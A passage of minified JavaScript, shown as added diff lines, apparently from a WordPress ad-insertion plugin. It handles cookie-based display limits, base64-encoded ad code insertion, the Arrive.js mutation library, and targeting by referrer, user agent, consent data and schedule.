+new Date(1*new Date+864E5*g.expires));g.expires=g.expires?g.expires.toUTCString():"";try{var l=JSON.stringify(k);/^[\{\[]/.test(l)&&(k=l)}catch(p){}k=d.write?d.write(k,h):encodeURIComponent(String(k)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g,decodeURIComponent);h=encodeURIComponent(String(h)).replace(/%(23|24|26|2B|5E|60|7C)/g,decodeURIComponent).replace(/[\(\)]/g,escape);l="";for(var n in g)g[n]&&(l+="; "+n,!0!==g[n]&&(l+="="+g[n].split(";")[0]));return document.cookie=
+h+"="+k+l}}function e(h,k){if("undefined"!==typeof document){for(var g={},l=document.cookie?document.cookie.split("; "):[],n=0;n<l.length;n++){var p=l[n].split("="),m=p.slice(1).join("=");k||'"'!==m.charAt(0)||(m=m.slice(1,-1));try{var q=p[0].replace(/(%[0-9A-Z]{2})+/g,decodeURIComponent);m=(d.read||d)(m,q)||m.replace(/(%[0-9A-Z]{2})+/g,decodeURIComponent);if(k)try{m=JSON.parse(m)}catch(r){}g[q]=m;if(h===q)break}catch(r){}}return h?g[h]:g}}b.set=f;b.get=function(h){return e(h,!1)};b.getJSON=function(h){return e(h,
+!0)};b.remove=function(h,k){f(h,"",a(k,{expires:-1}))};b.defaults={};b.withConverter=c;return b}return c(function(){})});AiCookies=Cookies.noConflict();
+ai_check_block=function(a){if(null==a)return!0;var c=AiCookies.getJSON("aiBLOCKS");ai_debug_cookie_status="";null==c&&(c={});"undefined"!==typeof ai_delay_showing_pageviews&&(c.hasOwnProperty(a)||(c[a]={}),c[a].hasOwnProperty("d")||(c[a].d=ai_delay_showing_pageviews));if(c.hasOwnProperty(a)){for(var d in c[a]){if("x"==d){var b="",f=document.querySelectorAll('span[data-ai-block="'+a+'"]')[0];"aiHash"in f.dataset&&(b=f.dataset.aiHash);f="";c[a].hasOwnProperty("h")&&(f=c[a].h);var e=new Date;e=c[a][d]-
+Math.round(e.getTime()/1E3);if(0<e&&f==b)return ai_debug_cookie_status=a="closed for "+e+" s = "+Math.round(1E4*e/3600/24)/1E4+" days",!1;ai_set_cookie(a,"x","");c[a].hasOwnProperty("i")||c[a].hasOwnProperty("c")||ai_set_cookie(a,"h","")}else if("d"==d){if(0!=c[a][d])return ai_debug_cookie_status=a="delayed for "+c[a][d]+" pageviews",!1}else if("i"==d){b="";f=document.querySelectorAll('span[data-ai-block="'+a+'"]')[0];"aiHash"in f.dataset&&(b=f.dataset.aiHash);f="";c[a].hasOwnProperty("h")&&(f=c[a].h);
+if(0==c[a][d]&&f==b)return ai_debug_cookie_status=a="max impressions reached",!1;if(0>c[a][d]&&f==b){e=new Date;e=-c[a][d]-Math.round(e.getTime()/1E3);if(0<e)return ai_debug_cookie_status=a="max imp. reached ("+Math.round(1E4*e/24/3600)/1E4+" days = "+e+" s)",!1;ai_set_cookie(a,"i","");c[a].hasOwnProperty("c")||c[a].hasOwnProperty("x")||ai_set_cookie(a,"h","")}}if("ipt"==d&&0==c[a][d]&&(e=new Date,b=Math.round(e.getTime()/1E3),e=c[a].it-b,0<e))return ai_debug_cookie_status=a="max imp. per time reached ("+
+Math.round(1E4*e/24/3600)/1E4+" days = "+e+" s)",!1;if("c"==d){b="";f=document.querySelectorAll('span[data-ai-block="'+a+'"]')[0];"aiHash"in f.dataset&&(b=f.dataset.aiHash);f="";c[a].hasOwnProperty("h")&&(f=c[a].h);if(0==c[a][d]&&f==b)return ai_debug_cookie_status=a="max clicks reached",!1;if(0>c[a][d]&&f==b){e=new Date;e=-c[a][d]-Math.round(e.getTime()/1E3);if(0<e)return ai_debug_cookie_status=a="max clicks reached ("+Math.round(1E4*e/24/3600)/1E4+" days = "+e+" s)",!1;ai_set_cookie(a,"c","");c[a].hasOwnProperty("i")||
+c[a].hasOwnProperty("x")||ai_set_cookie(a,"h","")}}if("cpt"==d&&0==c[a][d]&&(e=new Date,b=Math.round(e.getTime()/1E3),e=c[a].ct-b,0<e))return ai_debug_cookie_status=a="max clicks per time reached ("+Math.round(1E4*e/24/3600)/1E4+" days = "+e+" s)",!1}if(c.hasOwnProperty("G")&&c.G.hasOwnProperty("cpt")&&0==c.G.cpt&&(e=new Date,b=Math.round(e.getTime()/1E3),e=c.G.ct-b,0<e))return ai_debug_cookie_status=a="max global clicks per time reached ("+Math.round(1E4*e/24/3600)/1E4+" days = "+e+" s)",!1}ai_debug_cookie_status=
+"OK";return!0};
+ai_check_and_insert_block=function(a,c){if(null==a)return!0;var d=document.getElementsByClassName(c);if(d.length){d=d[0];var b=d.closest(".code-block"),f=ai_check_block(a);!f&&0!=parseInt(d.getAttribute("limits-fallback"))&&d.hasAttribute("data-fallback-code")&&(d.setAttribute("data-code",d.getAttribute("data-fallback-code")),b.hasAttribute("data-ai")&&d.hasAttribute("fallback-tracking")&&d.hasAttribute("fallback_level")&&b.setAttribute("data-ai-"+d.getAttribute("fallback_level"),d.getAttribute("fallback-tracking")),
+f=!0);if(f)ai_insert_code(d),b&&(f=b.querySelectorAll(".ai-debug-block"),b&&f.length&&(b.classList.remove("ai-list-block"),b.classList.remove("ai-list-block-ip"),b.classList.remove("ai-list-block-filter"),b.style.visibility="",b.classList.contains("ai-remove-position")&&(b.style.position="")));else{f=d.closest("div[data-ai]");if(null!=f&&"undefined"!=typeof f.getAttribute("data-ai")){var e=JSON.parse(b64d(f.getAttribute("data-ai")));"undefined"!==typeof e&&e.constructor===Array&&(e[1]="",f.setAttribute("data-ai",
+b64e(JSON.stringify(e))))}f=b.querySelectorAll(".ai-debug-block");b&&f.length&&(b.classList.remove("ai-list-block"),b.classList.remove("ai-list-block-ip"),b.classList.remove("ai-list-block-filter"),b.style.visibility="",b.classList.contains("ai-remove-position")&&(b.style.position=""))}d.classList.remove(c)}d=document.querySelectorAll("."+c+"-dbg");b=0;for(f=d.length;b<f;b++)e=d[b],e.querySelector(".ai-status").textContent=ai_debug_cookie_status,e.querySelector(".ai-cookie-data").textContent=ai_get_cookie_text(a),
+e.classList.remove(c+"-dbg")};function ai_load_cookie(){var a=AiCookies.getJSON("aiBLOCKS");null==a&&(a={});return a}function ai_get_cookie(a,c){var d="",b=ai_load_cookie();b.hasOwnProperty(a)&&b[a].hasOwnProperty(c)&&(d=b[a][c]);return d}
+function ai_set_cookie(a,c,d){var b=ai_load_cookie();if(""===d){if(b.hasOwnProperty(a)){delete b[a][c];a:{c=b[a];for(f in c)if(c.hasOwnProperty(f)){var f=!1;break a}f=!0}f&&delete b[a]}}else b.hasOwnProperty(a)||(b[a]={}),b[a][c]=d;0===Object.keys(b).length&&b.constructor===Object?AiCookies.remove("aiBLOCKS"):AiCookies.set("aiBLOCKS",b,{expires:365,path:"/"});return b}
+ai_get_cookie_text=function(a){var c=AiCookies.getJSON("aiBLOCKS");null==c&&(c={});var d="";c.hasOwnProperty("G")&&(d="G["+JSON.stringify(c.G).replace(/"/g,"").replace("{","").replace("}","")+"] ");var b="";c.hasOwnProperty(a)&&(b=JSON.stringify(c[a]).replace(/"/g,"").replace("{","").replace("}",""));return d+b};
+var $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.arrayIteratorImpl=function(a){var h=0;return function(){return h<a.length?{done:!1,value:a[h++]}:{done:!0}}};$jscomp.arrayIterator=function(a){return{next:$jscomp.arrayIteratorImpl(a)}};$jscomp.makeIterator=function(a){var h="undefined"!=typeof Symbol&&Symbol.iterator&&a[Symbol.iterator];return h?h.call(a):$jscomp.arrayIterator(a)};
+ai_insert=function(a,h,q){for(var k=-1!=h.indexOf(":eq")?jQuery(h):document.querySelectorAll(h),u=0,y=k.length;u<y;u++){var c=k[u];selector_string=c.hasAttribute("id")?"#"+c.getAttribute("id"):c.hasAttribute("class")?"."+c.getAttribute("class").replace(RegExp(" ","g"),"."):"";var v=document.createElement("div");v.innerHTML=q;var n=v.getElementsByClassName("ai-selector-counter")[0];null!=n&&(n.innerText=u+1);n=v.getElementsByClassName("ai-debug-name ai-main")[0];if(null!=n){var m="";"before"==a?m=
+ai_front.insertion_before:"after"==a?m=ai_front.insertion_after:"prepend"==a?m=ai_front.insertion_prepend:"append"==a?m=ai_front.insertion_append:"replace-content"==a?m=ai_front.insertion_replace_content:"replace-element"==a&&(m=ai_front.insertion_replace_element);-1==selector_string.indexOf(".ai-viewports")&&(n.innerText=m+" "+h+" ("+c.tagName.toLowerCase()+selector_string+")")}n=document.createRange();m=!0;try{var w=n.createContextualFragment(v.innerHTML)}catch(t){m=!1}"before"==a?m?c.parentNode.insertBefore(w,
+c):jQuery(v.innerHTML).insertBefore(jQuery(c)):"after"==a?m?c.parentNode.insertBefore(w,c.nextSibling):jQuery(v.innerHTML).insertBefore(jQuery(c.nextSibling)):"prepend"==a?m?c.insertBefore(w,c.firstChild):jQuery(v.innerHTML).insertBefore(jQuery(c.firstChild)):"append"==a?m?c.insertBefore(w,null):jQuery(v.innerHTML).appendTo(jQuery(c)):"replace-content"==a?(c.innerHTML="",m?c.insertBefore(w,null):jQuery(v.innerHTML).appendTo(jQuery(c))):"replace-element"==a&&(m?c.parentNode.insertBefore(w,c):jQuery(v.innerHTML).insertBefore(jQuery(c)),
+c.parentNode.removeChild(c))}};
+ai_insert_code=function(a){function h(n,m){return null==n?!1:n.classList?n.classList.contains(m):-1<(" "+n.className+" ").indexOf(" "+m+" ")}function q(n,m){null!=n&&(n.classList?n.classList.add(m):n.className+=" "+m)}function k(n,m){null!=n&&(n.classList?n.classList.remove(m):n.className=n.className.replace(new RegExp("(^|\\b)"+m.split(" ").join("|")+"(\\b|$)","gi")," "))}if("undefined"!=typeof a){var u=!1;if(h(a,"no-visibility-check")||a.offsetWidth||a.offsetHeight||a.getClientRects().length){u=
+a.getAttribute("data-code");var y=a.getAttribute("data-insertion"),c=a.getAttribute("data-selector");if(null!=u)if(null!=y&&null!=c){if(-1!=c.indexOf(":eq")?jQuery(c).length:document.querySelectorAll(c).length)ai_insert(y,c,b64d(u)),k(a,"ai-viewports")}else{y=document.createRange();c=!0;try{var v=y.createContextualFragment(b64d(u))}catch(n){c=!1}c?a.parentNode.insertBefore(v,a.nextSibling):jQuery(b64d(u)).insertBefore(jQuery(a.nextSibling));k(a,"ai-viewports")}u=!0}else v=a.previousElementSibling,
+h(v,"ai-debug-bar")&&h(v,"ai-debug-script")&&(k(v,"ai-debug-script"),q(v,"ai-debug-viewport-invisible")),k(a,"ai-viewports");return u}};
+ai_insert_list_code=function(a){var h=document.getElementsByClassName(a)[0];if("undefined"!=typeof h){var q=ai_insert_code(h),k=h.closest("div.code-block");if(k){q||k.removeAttribute("data-ai");var u=k.querySelectorAll(".ai-debug-block");k&&u.length&&(k.classList.remove("ai-list-block"),k.classList.remove("ai-list-block-ip"),k.classList.remove("ai-list-block-filter"),k.style.visibility="",k.classList.contains("ai-remove-position")&&(k.style.position=""))}h.classList.remove(a);q&&
+ai_process_elements()}};ai_insert_viewport_code=function(a){var h=document.getElementsByClassName(a)[0];if("undefined"!=typeof h){var q=ai_insert_code(h);h.classList.remove(a);q&&(a=h.closest("div.code-block"),null!=a&&(q=h.getAttribute("style"),null!=q&&a.setAttribute("style",a.getAttribute("style")+" "+q)));setTimeout(function(){h.removeAttribute("style")},2);ai_process_elements()}};
+ai_insert_adsense_fallback_codes=function(a){a.style.display="none";a=a.closest(".ai-fallback-adsense").nextElementSibling;a.getAttribute("data-code")?ai_insert_code(a)&&ai_process_elements():a.style.display="block"};ai_insert_code_by_class=function(a){var h=document.getElementsByClassName(a)[0];"undefined"!=typeof h&&(ai_insert_code(h),h.classList.remove(a))};
+ai_insert_client_code=function(a,h){var q=document.getElementsByClassName(a)[0];if("undefined"!=typeof q){var k=q.getAttribute("data-code");null!=k&&ai_check_block()&&ai_check_and_insert_block()&&(q.setAttribute("data-code",k.substring(Math.floor(h/19))),ai_insert_code_by_class(a),q.remove())}};ai_process_elements_active=!1;
+function ai_process_elements(){ai_process_elements_active||setTimeout(function(){ai_process_elements_active=!1;"function"==typeof ai_process_rotations&&ai_process_rotations();"function"==typeof ai_process_lists&&ai_process_lists(jQuery(".ai-list-data"));"function"==typeof ai_process_ip_addresses&&ai_process_ip_addresses(jQuery(".ai-ip-data"));"function"==typeof ai_process_filter_hooks&&ai_process_filter_hooks(jQuery(".ai-filter-check"));"function"==typeof ai_adb_process_blocks&&ai_adb_process_blocks();
+"function"==typeof ai_process_impressions&&1==ai_tracking_finished&&ai_process_impressions();"function"==typeof ai_install_click_trackers&&1==ai_tracking_finished&&ai_install_click_trackers();"function"==typeof ai_install_close_buttons&&ai_install_close_buttons(document)},5);ai_process_elements_active=!0}
+var targetNode=document.querySelector("body"),config={attributes:!0,childList:!1,subtree:!0},ai_adsense_callback=function(a,h){for(var q=$jscomp.makeIterator(a),k=q.next();!k.done;k=q.next())k=k.value,"attributes"===k.type&&"data-ad-status"==k.attributeName&&"unfilled"==k.target.dataset.adStatus&&k.target.closest(".ai-fallback-adsense")&&ai_insert_adsense_fallback_codes(k.target)},observer=new MutationObserver(ai_adsense_callback);observer.observe(targetNode,config);
+var Arrive=function(a,h,q){function k(t,d,e){c.addMethod(d,e,t.unbindEvent);c.addMethod(d,e,t.unbindEventWithSelectorOrCallback);c.addMethod(d,e,t.unbindEventWithSelectorAndCallback)}function u(t){t.arrive=m.bindEvent;k(m,t,"unbindArrive");t.leave=w.bindEvent;k(w,t,"unbindLeave")}if(a.MutationObserver&&"undefined"!==typeof HTMLElement){var y=0,c=function(){var t=HTMLElement.prototype.matches||HTMLElement.prototype.webkitMatchesSelector||HTMLElement.prototype.mozMatchesSelector||HTMLElement.prototype.msMatchesSelector;
+return{matchesSelector:function(d,e){return d instanceof HTMLElement&&t.call(d,e)},addMethod:function(d,e,f){var b=d[e];d[e]=function(){if(f.length==arguments.length)return f.apply(this,arguments);if("function"==typeof b)return b.apply(this,arguments)}},callCallbacks:function(d,e){e&&e.options.onceOnly&&1==e.firedElems.length&&(d=[d[0]]);for(var f=0,b;b=d[f];f++)b&&b.callback&&b.callback.call(b.elem,b.elem);e&&e.options.onceOnly&&1==e.firedElems.length&&e.me.unbindEventWithSelectorAndCallback.call(e.target,
+e.selector,e.callback)},checkChildNodesRecursively:function(d,e,f,b){for(var g=0,l;l=d[g];g++)f(l,e,b)&&b.push({callback:e.callback,elem:l}),0<l.childNodes.length&&c.checkChildNodesRecursively(l.childNodes,e,f,b)},mergeArrays:function(d,e){var f={},b;for(b in d)d.hasOwnProperty(b)&&(f[b]=d[b]);for(b in e)e.hasOwnProperty(b)&&(f[b]=e[b]);return f},toElementsArray:function(d){"undefined"===typeof d||"number"===typeof d.length&&d!==a||(d=[d]);return d}}}(),v=function(){var t=function(){this._eventsBucket=
+[];this._beforeRemoving=this._beforeAdding=null};t.prototype.addEvent=function(d,e,f,b){d={target:d,selector:e,options:f,callback:b,firedElems:[]};this._beforeAdding&&this._beforeAdding(d);this._eventsBucket.push(d);return d};t.prototype.removeEvent=function(d){for(var e=this._eventsBucket.length-1,f;f=this._eventsBucket[e];e--)d(f)&&(this._beforeRemoving&&this._beforeRemoving(f),(f=this._eventsBucket.splice(e,1))&&f.length&&(f[0].callback=null))};t.prototype.beforeAdding=function(d){this._beforeAdding=
+d};t.prototype.beforeRemoving=function(d){this._beforeRemoving=d};return t}(),n=function(t,d){var e=new v,f=this,b={fireOnAttributesModification:!1};e.beforeAdding(function(g){var l=g.target;if(l===a.document||l===a)l=document.getElementsByTagName("html")[0];var p=new MutationObserver(function(x){d.call(this,x,g)});var r=t(g.options);p.observe(l,r);g.observer=p;g.me=f});e.beforeRemoving(function(g){g.observer.disconnect()});this.bindEvent=function(g,l,p){l=c.mergeArrays(b,l);for(var r=c.toElementsArray(this),
+x=0;x<r.length;x++)e.addEvent(r[x],g,l,p)};this.unbindEvent=function(){var g=c.toElementsArray(this);e.removeEvent(function(l){for(var p=0;p<g.length;p++)if(this===q||l.target===g[p])return!0;return!1})};this.unbindEventWithSelectorOrCallback=function(g){var l=c.toElementsArray(this);e.removeEvent("function"===typeof g?function(p){for(var r=0;r<l.length;r++)if((this===q||p.target===l[r])&&p.callback===g)return!0;return!1}:function(p){for(var r=0;r<l.length;r++)if((this===q||p.target===l[r])&&p.selector===
+g)return!0;return!1})};this.unbindEventWithSelectorAndCallback=function(g,l){var p=c.toElementsArray(this);e.removeEvent(function(r){for(var x=0;x<p.length;x++)if((this===q||r.target===p[x])&&r.selector===g&&r.callback===l)return!0;return!1})};return this},m=new function(){function t(f,b,g){return c.matchesSelector(f,b.selector)&&(f._id===q&&(f._id=y++),-1==b.firedElems.indexOf(f._id))?(b.firedElems.push(f._id),!0):!1}var d={fireOnAttributesModification:!1,onceOnly:!1,existing:!1};m=new n(function(f){var b=
+{attributes:!1,childList:!0,subtree:!0};f.fireOnAttributesModification&&(b.attributes=!0);return b},function(f,b){f.forEach(function(g){var l=g.addedNodes,p=g.target,r=[];null!==l&&0<l.length?c.checkChildNodesRecursively(l,b,t,r):"attributes"===g.type&&t(p,b,r)&&r.push({callback:b.callback,elem:p});c.callCallbacks(r,b)})});var e=m.bindEvent;m.bindEvent=function(f,b,g){"undefined"===typeof g?(g=b,b=d):b=c.mergeArrays(d,b);var l=c.toElementsArray(this);if(b.existing){for(var p=[],r=0;r<l.length;r++)for(var x=
+l[r].querySelectorAll(f),z=0;z<x.length;z++)p.push({callback:g,elem:x[z]});if(b.onceOnly&&p.length)return g.call(p[0].elem,p[0].elem);setTimeout(c.callCallbacks,1,p)}e.call(this,f,b,g)};return m},w=new function(){function t(f,b){return c.matchesSelector(f,b.selector)}var d={};w=new n(function(){return{childList:!0,subtree:!0}},function(f,b){f.forEach(function(g){g=g.removedNodes;var l=[];null!==g&&0<g.length&&c.checkChildNodesRecursively(g,b,t,l);c.callCallbacks(l,b)})});var e=w.bindEvent;w.bindEvent=
+function(f,b,g){"undefined"===typeof g?(g=b,b=d):b=c.mergeArrays(d,b);e.call(this,f,b,g)};return w};h&&u(h.fn);u(HTMLElement.prototype);u(NodeList.prototype);u(HTMLCollection.prototype);u(HTMLDocument.prototype);u(Window.prototype);h={};k(m,h,"unbindAllArrive");k(w,h,"unbindAllLeave");return h}}(window,"undefined"===typeof jQuery?null:jQuery,void 0);
+var $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.createTemplateTagFirstArg=function(a){return a.raw=a};$jscomp.createTemplateTagFirstArgWithRaw=function(a,n){a.raw=n;return a};$jscomp.arrayIteratorImpl=function(a){var n=0;return function(){return n<a.length?{done:!1,value:a[n++]}:{done:!0}}};$jscomp.arrayIterator=function(a){return{next:$jscomp.arrayIteratorImpl(a)}};$jscomp.makeIterator=function(a){var n="undefined"!=typeof Symbol&&Symbol.iterator&&a[Symbol.iterator];return n?n.call(a):$jscomp.arrayIterator(a)};
+jQuery(function(a){function n(c){c=c.match(ba);return null!=c&&1<c.length&&"string"===typeof c[1]&&0<c[1].length?c[1].toLowerCase():null}function E(c){return c.includes(":")?(c=c.split(":"),1E3*(3600*parseInt(c[0])+60*parseInt(c[1])+parseInt(c[2]))):null}function u(c){try{var l=Date.parse(c);isNaN(l)&&(l=null)}catch(G){l=null}if(null==l&&c.includes(" ")){c=c.split(" ");try{l=Date.parse(c[0]),l+=E(c[1]),isNaN(l)&&(l=null)}catch(G){l=null}}return l}function H(){(jQuery("#ai-iab-tcf-bar").length||jQuery(".ai-list-manual").length)&&
+"function"==typeof __tcfapi&&"function"==typeof ai_load_blocks&&"undefined"==typeof ai_iab_tcf_callback_installed&&(__tcfapi("addEventListener",2,function(c,l){l&&"useractioncomplete"===c.eventStatus&&(ai_tcData=c,ai_load_blocks(),jQuery("#ai-iab-tcf-status").text("IAB TCF 2.0 DATA LOADED"),jQuery("#ai-iab-tcf-bar").addClass("status-ok").removeClass("status-error"))}),ai_iab_tcf_callback_installed=!0)}function v(c){c=("; "+document.cookie).split("; "+c+"=");if(2===c.length)return c.pop().split(";").shift()}
+function k(c){if(v(c)){var l=window.location.hostname;v(c)&&(document.cookie=c+"=;path=/"+(l?";domain="+l:"")+";expires=Thu, 01 Jan 1970 00:00:01 GMT");document.cookie=c+"=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;"}}Array.prototype.includes||(Array.prototype.includes=function(c){return!!~this.indexOf(c)});var ba=RegExp(":\\/\\/(.[^/:]+)","i");ai_process_lists=function(c){function l(m,e,d){if(0==m.length){if("!@!"==d)return!0;e!=d&&("true"==d.toLowerCase()?d=!0:"false"==d.toLowerCase()&&(d=
+!1));return e==d}if("object"!=typeof e&&"array"!=typeof e)return!1;var h=m[0];m=m.slice(1);if("*"==h)for(e=$jscomp.makeIterator(Object.entries(e)),h=e.next();!h.done;h=e.next()){if(h=$jscomp.makeIterator(h.value),h.next(),h=h.next().value,l(m,h,d))return!0}else if(h in e)return l(m,e[h],d);return!1}function G(m,e,d){if("object"!=typeof m||-1==e.indexOf("["))return!1;e=e.replace(/]| /gi,"").split("[");return l(e,m,d)}function ca(){"function"==typeof __tcfapi&&(a("#ai-iab-tcf-status").text("IAB TCF 2.0 DETECTED"),
+__tcfapi("getTCData",2,function(m,e){e?(a("#ai-iab-tcf-bar").addClass("status-ok"),"tcloaded"==m.eventStatus||"useractioncomplete"==m.eventStatus?(ai_tcData=m,m.gdprApplies?a("#ai-iab-tcf-status").text("IAB TCF 2.0 DATA LOADED"):jQuery("#ai-iab-tcf-status").text("IAB TCF 2.0 GDPR DOES NOT APPLY"),a("#ai-iab-tcf-bar").addClass("status-ok").removeClass("status-error"),setTimeout(function(){ai_process_lists()},10)):"cmpuishown"==m.eventStatus&&(ai_cmpuishown=!0,a("#ai-iab-tcf-status").text("IAB TCF 2.0 CMP UI SHOWN"),
+a("#ai-iab-tcf-bar").addClass("status-ok").removeClass("status-error"))):(a("#ai-iab-tcf-status").text("IAB TCF 2.0 __tcfapi getTCData failed"),a("#ai-iab-tcf-bar").removeClass("status-ok").addClass("status-error"))}))}function K(m){"function"==typeof __tcfapi?("undefined"==typeof ai_iab_tcf_callback_installed&&H(),"undefined"==typeof ai_tcData_requested&&(ai_tcData_requested=!0,ca(),cookies_need_tcData=!0)):m&&(a("#ai-iab-tcf-bar").addClass("status-error").removeClass("status-ok"),a("#ai-iab-tcf-status").text("IAB TCF 2.0 MISSING: __tcfapi function not found"))}
+c=null==c?a("div.ai-list-data, meta.ai-list-data"):c.filter(".ai-list-data");if(c.length){c.removeClass("ai-list-data");var V=getAllUrlParams(window.location.search);if(null!=V.referrer)var x=V.referrer;else x=document.referrer,""!=x&&(x=n(x));var R=window.navigator.userAgent,S=R.toLowerCase(),W=navigator.language,L=W.toLowerCase();if("undefined"!==typeof MobileDetect)var X=new MobileDetect(R);c.each(function(){var m=document.cookie.split(";");m.forEach(function(A,f){m[f]=A.trim()});var e=a(this).closest("div.code-block"),
+d=!0,h=a(this).attr("referer-list");if("undefined"!=typeof h){h=b64d(h).split(",");var r=a(this).attr("referer-list-type"),I=!1;a.each(h,function(A,f){f=f.trim();if(""==f)return!0;if("*"==f.charAt(0))if("*"==f.charAt(f.length-1)){if(f=f.substr(1,f.length-2),-1!=x.indexOf(f))return I=!0,!1}else{if(f=f.substr(1),x.substr(-f.length)==f)return I=!0,!1}else if("*"==f.charAt(f.length-1)){if(f=f.substr(0,f.length-1),0==x.indexOf(f))return I=!0,!1}else if("#"==f){if(""==x)return I=!0,!1}else if(f==x)return I=
+!0,!1});var p=I;switch(r){case "B":p&&(d=!1);break;case "W":p||(d=!1)}}if(d&&(h=a(this).attr("client-list"),"undefined"!=typeof h&&"undefined"!==typeof X))switch(h=b64d(h).split(","),r=a(this).attr("client-list-type"),p=!1,a.each(h,function(A,f){if(""==f.trim())return!0;var M=f.split("&&");a.each(M,function(da,b){var y=!0,t=!1;b=b.trim();"!!"==b.substring(0,2)&&(y=!1,b=b.substring(2));"language:"==b.substring(0,9)&&(t=!0,b=b.substring(9).toLowerCase());var q=!1;t?"*"==b.charAt(0)?"*"==b.charAt(b.length-
+1)?(b=b.substr(1,b.length-2).toLowerCase(),-1!=L.indexOf(b)&&(q=!0)):(b=b.substr(1).toLowerCase(),L.substr(-b.length)==b&&(q=!0)):"*"==b.charAt(b.length-1)?(b=b.substr(0,b.length-1).toLowerCase(),0==L.indexOf(b)&&(q=!0)):b==L&&(q=!0):"*"==b.charAt(0)?"*"==b.charAt(b.length-1)?(b=b.substr(1,b.length-2).toLowerCase(),-1!=S.indexOf(b)&&(q=!0)):(b=b.substr(1).toLowerCase(),S.substr(-b.length)==b&&(q=!0)):"*"==b.charAt(b.length-1)?(b=b.substr(0,b.length-1).toLowerCase(),0==S.indexOf(b)&&(q=!0)):X.is(b)&&
+(q=!0);p=q?y:!y;if(!p)return!1});if(p)return!1}),r){case "B":p&&(d=!1);break;case "W":p||(d=!1)}var N=h=!1;for(r=1;2>=r;r++)if(d){switch(r){case 1:var g=a(this).attr("cookie-list");break;case 2:g=a(this).attr("parameter-list")}if("undefined"!=typeof g){g=b64d(g);switch(r){case 1:var B=a(this).attr("cookie-list-type");break;case 2:B=a(this).attr("parameter-list-type")}g=g.replace("tcf-gdpr","tcf-v2[gdprApplies]=true");g=g.replace("tcf-no-gdpr","tcf-v2[gdprApplies]=false");g=g.replace("tcf-google",
+"tcf-v2[vendor][consents][755]=true && tcf-v2[purpose][consents][1]=true");g=g.replace("tcf-media.net","tcf-v2[vendor][consents][142]=true && tcf-v2[purpose][consents][1]=true");g=g.replace("tcf-amazon","tcf-v2[vendor][consents][793]=true && tcf-v2[purpose][consents][1]=true");g=g.replace("tcf-ezoic","tcf-v2[vendor][consents][347]=true && tcf-v2[purpose][consents][1]=true");var D=g.split(","),Y=[];m.forEach(function(A){A=A.split("=");try{var f=JSON.parse(decodeURIComponent(A[1]))}catch(M){f=decodeURIComponent(A[1])}Y[A[0]]=
+f});p=!1;var O=a(this);a.each(D,function(A,f){var M=f.split("&&");a.each(M,function(da,b){var y=!0;b=b.trim();"!!"==b.substring(0,2)&&(y=!1,b=b.substring(2));var t=b,q="!@!",Z=-1!=b.indexOf("["),aa=(0==b.indexOf("tcf-v2")||0==b.indexOf("euconsent-v2"))&&-1!=b.indexOf("[");-1!=b.indexOf("=")&&(q=b.split("="),t=q[0],q=q[1],Z=-1!=t.indexOf("["),aa=(0==t.indexOf("tcf-v2")||0==t.indexOf("euconsent-v2"))&&-1!=t.indexOf("["));if(aa)a("#ai-iab-tcf-bar").show(),"object"==typeof ai_tcData?(a("#ai-iab-tcf-bar").addClass("status-ok"),
+t=t.replace(/]| /gi,"").split("["),t.shift(),p=(t=l(t,ai_tcData,q))?y:!y):(O.addClass("ai-list-data"),N=!0,"function"==typeof __tcfapi?K(!1):"undefined"==typeof ai_tcData_retrying&&(ai_tcData_retrying=!0,setTimeout(function(){"function"==typeof __tcfapi?K(!1):setTimeout(function(){"function"==typeof __tcfapi?K(!1):setTimeout(function(){K(!0)},3E3)},1E3)},600)));else if(Z)p=(t=G(Y,t,q))?y:!y;else{var T=!1;"!@!"==q?m.every(function(ea){return ea.split("=")[0]==b?(T=!0,!1):!0}):T=-1!=m.indexOf(b);p=
+T?y:!y}if(!p)return!1});if(p)return!1});p&&(N=!1);switch(B){case "B":p&&(d=!1);break;case "W":p||(d=!1)}}}a(this).hasClass("ai-list-manual")&&(d?(O.removeClass("ai-list-data"),O.removeClass("ai-list-manual")):(h=!0,O.addClass("ai-list-data")));if(d||!h&&!N)if(g=a(this).data("debug-info"),"undefined"!=typeof g&&(g=a("."+g),0!=g.length)){var w=g.parent();w.hasClass("ai-debug-info")&&w.remove()}w=a(this).prevAll(".ai-debug-bar.ai-debug-lists");g=""==x?"#":x;w.find(".ai-debug-name.ai-list-info").text(g).attr("title",
+R+"\n"+W);w.find(".ai-debug-name.ai-list-status").text(d?ai_front.visible:ai_front.hidden);g=!1;if(d&&(r=a(this).attr("scheduling-start"),B=a(this).attr("scheduling-end"),D=a(this).attr("scheduling-days"),"undefined"!=typeof r&&"undefined"!=typeof B&&"undefined"!=typeof D)){g=!0;var z=b64d(r),P=b64d(B),U=parseInt(a(this).attr("scheduling-fallback")),Q=parseInt(a(this).attr("gmt"));z.includes("-")||P.includes("-")?(B=u(z)+Q,r=u(P)+Q):(B=E(z),r=E(P));D=b64d(D).split(",");w=a(this).attr("scheduling-type");
+var C=(new Date).getTime()+Q,F=new Date(C),J=F.getDay();z.includes("-")||P.includes("-")||(z=(new Date(F.getFullYear(),F.getMonth(),F.getDate())).getTime()+Q,C-=z,0>C&&(C+=864E5));0==J?J=6:J--;z=C>=B&&C<r&&D.includes(J.toString());switch(w){case "B":z=!z}z||(d=!1);F=F.toISOString().split(".")[0].replace("T"," ");w=a(this).prevAll(".ai-debug-bar.ai-debug-scheduling");w.find(".ai-debug-name.ai-scheduling-info").text(F+" "+J+" current_time:"+Math.floor(C.toString()/1E3)+"  start_date:"+Math.floor(B/
+1E3).toString()+" ="+(C>=B).toString()+" end_date:"+Math.floor(r/1E3).toString()+" =:"+(C<r).toString()+" days:"+D.toString()+" =:"+D.includes(J.toString()).toString());w.find(".ai-debug-name.ai-scheduling-status").text(d?ai_front.visible:ai_front.hidden);d||0==U||(w.removeClass("ai-debug-scheduling").addClass("ai-debug-fallback"),w.find(".ai-debug-name.ai-scheduling-status").text(ai_front.fallback+" = "+U))}if(h||!d&&N)return!0;a(this).css({visibility:"",position:"",width:"",height:"","z-index":""});
